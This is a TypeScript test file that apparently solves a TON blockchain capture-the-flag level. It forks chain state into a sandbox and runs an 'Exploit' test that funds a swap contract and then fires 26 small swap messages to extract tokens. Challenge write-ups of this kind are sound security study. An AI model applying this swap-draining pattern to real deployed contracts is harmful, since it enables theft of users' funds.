import {
    Blockchain,
    RemoteBlockchainStorage,
    SandboxContract,
    TreasuryContract,
    wrapTonClient4ForRemote,
} from '@ton/sandbox';
import '@ton/test-utils';
import { Address, fromNano, toNano } from '@ton/core';
import { TonClient4 } from '@ton/ton';
import { SwapLevel } from '../wrappers/wrappers/SwapLevel';
import { Token } from '../wrappers/wrappers/SwapLevelToken';

// npx blueprint test 7. SwapLevel.spec.ts
describe('PeekLevel', () => {
    let blockchain: Blockchain;

    let level: SandboxContract<SwapLevel>;
    const level_addr = Address.parse('EQAFxm2YHjvO35vJ8WSjbTSuuZmjZY1_yljx1ZIJlcxPmv-4');
    let token: SandboxContract<Token>;

    let player: SandboxContract<TreasuryContract>;
    let owner: SandboxContract<TreasuryContract>;

    beforeAll(async () => {
        blockchain = await Blockchain.create({
            storage: new RemoteBlockchainStorage(
                wrapTonClient4ForRemote(
                    new TonClient4({
                        endpoint: 'https://sandbox-v4.tonhubapi.com',
                    }),
                ),
            ),
        });
        player = await blockchain.treasury('player');
        owner = await blockchain.treasury('owner');

        level = blockchain.openContract(SwapLevel.fromAddress(level_addr));
        token = blockchain.openContract(
            Token.fromAddress(Address.parse('EQCMvcB8bGhdiQ0Txyr_w8-0Hz_kItu_8wePQ0qabANwqvVO')),
        );
    });

    it('Exploit', async () => {
        await level.send(player.getSender(), { value: toNano('40') }, null);
        for (let i = 0; i < 26; i++) {
            await level.send(player.getSender(), { value: toNano('0.1') }, 'swap ton to tokens');
        }
        await getBalance();

        console.log('Token Balance', fromNano(await token.getBalance()));
    });

    const getBalance = async () => {
        console.log((await blockchain.getContract(level_addr)).balance);
    };
});
